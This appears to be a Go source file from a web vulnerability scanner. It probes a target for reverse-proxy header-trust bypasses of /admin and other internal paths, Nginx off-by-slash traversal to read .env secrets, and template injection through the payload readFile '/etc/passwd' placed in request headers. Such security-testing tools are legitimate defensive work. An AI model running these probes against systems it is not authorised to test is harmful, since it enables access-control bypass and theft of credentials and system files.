package proxy

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"sort"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

var (
	internalHeaders = map[string]string{
		"X-Forwarded-For":    "127.0.0.1",
		"X-Real-IP":          "127.0.0.1",
		"True-Client-IP":     "127.0.0.1",
		"Client-IP":          "127.0.0.1",
		"Forwarded":          "for=127.0.0.1;by=127.0.0.1",
		"X-Originating-IP":   "127.0.0.1",
		"X-Remote-IP":        "127.0.0.1",
		"X-Remote-Addr":      "127.0.0.1",
		"X-Client-IP":        "127.0.0.1",
		"X-Host":             "127.0.0.1",
		"X-Forwarded-Host":   "127.0.0.1",
		"X-Forwarded-Server": "127.0.0.1",
	}

	internalPaths = []string{"/admin", "/internal", "/stats", "/server-status", "/config", "/api/v1/admin"}
)

type bypassEvidence struct {
	Header      string
	Endpoint    string
	BodySummary string
	Sensitive   bool
	BaseHash    string
	AttackHash  string
}

// Scan tests for reverse-proxy trust misconfiguration and reports one root-cause cluster.
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if strings.TrimSpace(baseURL) == "" {
		return
	}

	// 1. Reverse Proxy Bypass for Internal Paths (Only for root/base scan)
	// We check if we can reach /admin by spoofing headers when it's otherwise blocked.
	checkReverseProxyBypass(baseURL, client, onFound)

	// 2. Header Mutation Validation (For every endpoint)
	// We check if mutating headers on a 200 OK page changes the response,
	// which indicates the header is being processed/trusted in a way that affects application logic.
	checkHeaderMutationTrust(baseURL, client, onFound)

	// 3. Nginx off-by-slash traversal
	checkNginxTraversal(baseURL, client, onFound)

	// 4. Template Injection in headers
	checkTemplateInjection(baseURL, client, onFound)
}

func checkReverseProxyBypass(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if !strings.HasSuffix(baseURL, "/") {
		baseURL += "/"
	}

	vectors := make([]bypassEvidence, 0, 32)
	confirmedHeaders := make(map[string]bool)
	impactedEndpoints := make(map[string]bool)
	hasSensitiveExposure := false

	for _, path := range internalPaths {
		target := baseURL + strings.TrimPrefix(path, "/")

		respBase, err := client.Get(target)
		if err != nil {
			continue
		}
		baseStatus := respBase.StatusCode
		baseBody, _ := io.ReadAll(io.LimitReader(io.LimitReader(respBase.Body, 5*1024*1024), 5*1024*1024))
		respBase.Body.Close()
		baseHash := hashBody(baseBody)

		// We only care if it was blocked (403/401) and we bypassed it.
		if baseStatus != http.StatusForbidden && baseStatus != http.StatusUnauthorized {
			continue
		}

		for hName, hVal := range internalHeaders {
			req, err := http.NewRequest(http.MethodGet, target, nil)
			if err != nil {
				continue
			}
			req.Header.Set(hName, hVal)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				bodyStr := string(body)
				bodyLower := strings.ToLower(bodyStr)
				attackHash := hashBody(body)

				if attackHash == baseHash {
					continue
				}

				isSensitive := strings.Contains(bodyLower, "admin") ||
					strings.Contains(bodyLower, "config") ||
					strings.Contains(bodyLower, "dashboard") ||
					strings.Contains(bodyLower, "root")

				confirmedHeaders[hName] = true
				impactedEndpoints[target] = true
				if isSensitive {
					hasSensitiveExposure = true
				}

				vectors = append(vectors, bypassEvidence{
					Header:      hName,
					Endpoint:    target,
					BodySummary: summarizeBody(bodyStr),
					Sensitive:   isSensitive,
					BaseHash:    shortHash(baseHash),
					AttackHash:  shortHash(attackHash),
				})
			}
		}
	}

	if len(vectors) > 0 {
		detail := buildProxyRootCauseDetail(vectors, confirmedHeaders, impactedEndpoints, len(internalHeaders))
		severity := "High"
		if hasSensitiveExposure {
			severity = "Critical"
		}

		onFound(core.Finding{
			Type:       "Improper Trust in HTTP Headers (Proxy Bypass)",
			Target:     baseURL,
			Detail:     detail,
			Severity:   severity,
			Confidence: "confirmed",
		})
	}
}

func checkHeaderMutationTrust(url string, client *http.Client, onFound func(core.Finding)) {
	// Baseline
	respBase, err := client.Get(url)
	if err != nil {
		return
	}
	if respBase.StatusCode != 200 {
		respBase.Body.Close()
		return
	}
	baseBody, _ := io.ReadAll(io.LimitReader(io.LimitReader(respBase.Body, 5*1024*1024), 5*1024*1024))
	respBase.Body.Close()
	baseHash := hashBody(baseBody)

	trustedHeaders := []string{}

	// Test a subset of headers that might affect response logic
	testHeaders := map[string]string{
		"X-Forwarded-Host": "internal-restricted.local",
		"X-Forwarded-For":  "127.0.0.1",
		"X-Original-URL":   "/admin-internal-dashboard",
	}

	for hName, hVal := range testHeaders {
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		req.Header.Set(hName, hVal)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		resp.Body.Close()

		attackHash := hashBody(body)

		// If response changes significantly, it indicates the header is being processed.
		// We ONLY care if the response remains 200 OK but the content changes.
		// If it changes to 403, 417, or 5xx, it's likely a WAF/CDN blocking the "suspicious" header.
		if resp.StatusCode == 200 && attackHash != baseHash {
			// Significant difference found in a successful response
			trustedHeaders = append(trustedHeaders, fmt.Sprintf("%s (Status: %d, Body Changed: true)", hName, resp.StatusCode))
		}
	}

	if len(trustedHeaders) > 0 {
		onFound(core.Finding{
			Type:       "Improper Trust in HTTP Headers (Behavioral)",
			Target:     url,
			Detail:     fmt.Sprintf("Server response changed when mutating proxy-related headers. This suggests the server trusts and processes these headers, which could lead to bypasses if misconfigured.\nHeaders observed affecting response:\n- %s", strings.Join(trustedHeaders, "\n- ")),
			Severity:   "Low", // Behavioral trust is Low unless it bypasses an actual restriction (which checkReverseProxyBypass handles)
			Confidence: "probable",
		})
	}
}

func checkNginxTraversal(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if !strings.HasSuffix(baseURL, "/") {
		baseURL += "/"
	}
	nginxPaths := []string{"static", "assets", "js", "css"}
	for _, p := range nginxPaths {
		target := baseURL + p + "../.env"
		resp, err := client.Get(target)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		resp.Body.Close()
		bodyStr := string(body)

		isHTML := strings.Contains(strings.ToLower(bodyStr), "<html") ||
			strings.Contains(strings.ToLower(bodyStr), "<!doctype")
		isEnv := strings.Contains(bodyStr, "DB_") ||
			strings.Contains(bodyStr, "APP_") ||
			strings.Contains(bodyStr, "SECRET")

		if resp.StatusCode == http.StatusOK && strings.Contains(bodyStr, "=") && !isHTML && isEnv {
			onFound(core.Finding{
				Type:       "Nginx Configuration Error",
				Target:     target,
				Detail:     "Off-by-slash alias traversal leaked .env file",
				Severity:   "Critical",
				Confidence: "confirmed",
			})
		}
	}
}

func checkTemplateInjection(baseURL string, client *http.Client, onFound func(core.Finding)) {
	templatePayload := `{{readFile "/etc/passwd"}}`
	req, err := http.NewRequest(http.MethodGet, baseURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("Referer", templatePayload)
	req.Header.Set("User-Agent", templatePayload)

	resp, err := client.Do(req)
	if err == nil {
		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		resp.Body.Close()
		if strings.Contains(string(body), "root:x:") {
			onFound(core.Finding{
				Type:       "Server-Side Template Injection",
				Target:     baseURL,
				Detail:     "Caddy/Go Template Injection via headers confirmed",
				Severity:   "Critical",
				Confidence: "confirmed",
			})
		}
	}
}

func buildProxyRootCauseDetail(vectors []bypassEvidence, confirmedHeaders map[string]bool, impactedEndpoints map[string]bool, testedHeaders int) string {
	headers := make([]string, 0, len(confirmedHeaders))
	for h := range confirmedHeaders {
		headers = append(headers, h)
	}
	sort.Strings(headers)

	endpoints := make([]string, 0, len(impactedEndpoints))
	for ep := range impactedEndpoints {
		endpoints = append(endpoints, ep)
	}
	sort.Strings(endpoints)

	var b strings.Builder
	b.WriteString("Root Cause: Reverse Proxy Header Trust Misconfiguration\n")
	b.WriteString("Impact:\n")
	b.WriteString(" - Internal endpoint access-control bypass\n")
	b.WriteString(fmt.Sprintf("Confirmed headers: %s\n", strings.Join(headers, ", ")))
	b.WriteString("Impacted endpoints:\n")
	for _, ep := range endpoints {
		b.WriteString("- " + ep + "\n")
	}
	return strings.TrimSpace(b.String())
}

func summarizeBody(body string) string {
	normalized := strings.Join(strings.Fields(strings.TrimSpace(body)), " ")
	if normalized == "" {
		return "<empty>"
	}
	if len(normalized) > 60 {
		return normalized[:60] + "..."
	}
	return normalized
}

func hashBody(body []byte) string {
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:])
}

func shortHash(h string) string {
	if len(h) <= 10 {
		return h
	}
	return h[:10]
}
